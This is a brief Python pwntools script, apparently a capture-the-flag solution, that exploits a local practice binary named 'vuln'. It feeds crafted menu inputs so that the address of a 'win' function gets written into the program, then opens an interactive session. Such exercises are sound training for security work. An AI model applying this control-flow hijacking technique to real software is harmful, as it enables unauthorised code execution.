from pwn import *

def exploit():
    p = process("./vuln")
    binary = ELF("vuln")    
    address = binary.symbols["win"] 
    
    p.sendlineafter("student\n", "a") # bebas
    p.sendlineafter("student \n", "b")
    p.sendlineafter("score \n", "a")
    p.sendlineafter("scored \n", "b")
    p.sendlineafter("score: \n", str(address))    
    
    p.sendlineafter("student\n", "c")
    p.sendlineafter("student \n", "d")
    p.sendlineafter("score \n", "b")
    p.sendlineafter("scored \n", "d")
    p.sendlineafter("score: \n", "0")

    p.interactive()

if __name__ == "__main__":
    exploit()